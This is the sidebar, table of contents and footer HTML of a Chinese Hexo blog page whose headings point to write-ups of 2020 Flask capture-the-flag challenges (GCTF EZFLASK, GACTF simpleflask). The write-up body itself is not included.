              <p class="site-author-name" itemprop="name">安大侠</p>
              <div class="site-description motion-element" itemprop="description">每天挣扎的活着</div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">67</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  
                    
                      <a href="/categories/">
                    
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">12</span>
                    <span class="site-state-item-name">分类</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  
                    
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">3</span>
                    <span class="site-state-item-name">标签</span>
                  
                </div>
              
            </nav>
          

          

          

          

          
             <div class="cc-license motion-element" itemprop="license">
              
              
                
              
              
              
              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
             </div>
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://hengyud.cn" title="https://hengyud.cn" rel="noopener" target="_blank">小P</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.lookupes.cn" title="http://blog.lookupes.cn" rel="noopener" target="_blank">孙哥</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://timeshu.github.io" title="https://timeshu.github.io" rel="noopener" target="_blank">Time</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://zo1ro.github.io" title="http://zo1ro.github.io" rel="noopener" target="_blank">imy0r1in</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://jgeek.cn/" title="https://jgeek.cn/" rel="noopener" target="_blank">\0x584A</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </div>

      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-GCTF-EZFLASK"><span class="nav-number">1.</span> <span class="nav-text">2020 GCTF EZFLASK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-GACTF-simpleflask"><span class="nav-number">2.</span> <span class="nav-text">2020 GACTF simpleflask</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-GCTF-EZFLASK-1"><span class="nav-number">3.</span> <span class="nav-text">2020 GCTF EZFLASK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-GACTF-simpleflask-1"><span class="nav-number">4.</span> <span class="nav-text">2020 GACTF simpleflask</span></a></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      

    </div>
  </aside>
  


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">安大侠</span>

  

  
</div>


  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>




        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="post-meta-item-icon">
      <i class="fa fa-user"></i>
    </span>
    <span class="site-uv" title="总访客量">
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
    </span>
  

  
    <span class="post-meta-divider">|</span>
  

  
    <span class="post-meta-item-icon">
      <i class="fa fa-eye"></i>
    </span>
    <span class="site-pv" title="总访问量">
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
  
</div>









        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=3.4.1"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/utils.js?v=7.1.2"></script>

  <script src="/js/motion.js?v=7.1.2"></script>



  
  


  <script src="/js/affix.js?v=7.1.2"></script>

  <script src="/js/schemes/pisces.js?v=7.1.2"></script>




  
  <script src="/js/scrollspy.js?v=7.1.2"></script>
<script src="/js/post-details.js?v=7.1.2"></script>



  


  <script src="/js/next-boot.js?v=7.1.2"></script>


  

  

  

  


  


  




  

  

  

  

  

  

  

  

  

  

  

  

  

  

</body>
</html>
